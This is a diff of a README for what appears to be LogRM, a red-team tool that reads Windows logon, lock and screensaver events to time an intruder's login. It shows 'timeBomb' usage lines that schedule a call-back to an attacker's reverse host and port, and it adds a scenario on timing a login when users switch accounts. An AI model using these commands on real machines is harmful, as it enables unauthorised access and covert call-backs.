@@ -117,19 +117,26 @@ PS> timeBomb -task now -newest <give a big number> -reverseHost <Python server i
 PS> timeBomb -task now -ip 127.0.0.1 -newest <give a big number> -reverseHost <Python server ip> -reversePort <Python server port>
 ```
 
-#### Example 1 - User is logged of -> Login
+#### Example 1 - User is logged of -> Login (easy)
 
 ![alt text](https://github.com/tasox/LogRM/blob/master/user_is_loggedOf.png)
 
 
-#### Example 2 - Screen saver is invoked -> Login
+#### Example 2 - Screen saver is invoked -> Login (easy)
 
 ![alt text](https://github.com/tasox/LogRM/blob/master/scrren_saver_is_invoked.png)
 
 
-##### And a few seconds if you run the script again you will see the following result
+##### if you run the script again after a while you will see the following result. 'Screensaver is invoked' as well as the 'Workstation is locked'.
 
 ![alt text](https://github.com/tasox/LogRM/blob/master/scrren_saver_is_invoked2.png)
+
+#### Example 3 - User switch between accounts -> Login (medium)
+
+In this scenario the user does not log of nor lock out from his account but instead of this uses "switch" between different accounts. The script will inform us that user's workstation is locked but this doesn't mean in all cases as you will see later that the user is not inside. To accomplish a successful login we have to observe the time of user's disconnection.
+
+![alt_text]()
+
 
 The task is going to run once at specific time.
 ```
